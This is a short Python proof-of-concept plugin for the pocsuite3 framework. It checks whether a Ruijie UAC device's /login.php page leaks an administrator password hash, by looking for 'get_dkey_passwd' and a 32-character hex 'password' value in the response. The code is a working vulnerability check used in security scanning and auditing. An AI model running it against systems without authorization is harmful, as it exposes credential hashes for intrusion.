#!/usr/bin/env python
# -*- coding:utf-8 -*-
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url
import re


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''ruijie_uac_info_disclosure'''
    desc = ''''''
    severity = '''low'''
    vulType = '''info-disclosure'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = ''''''
    appVersion = ''''''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        self.url, ip, port = parse_ip_port(self.target, 80)
        result = {}
        payload_url = make_verify_url(self.url, '/login.php', mod=0)
        resp = requests.get(payload_url, allow_redirects=False, verify=False, timeout=15)
        re_resp = re.match(b'"password":"[a-f0-9]{32}"', resp.content)
        if resp.status_code == 200 and b'get_dkey_passwd' in resp.content and re_resp:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['port'] = port
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


register_poc(TestPOC)
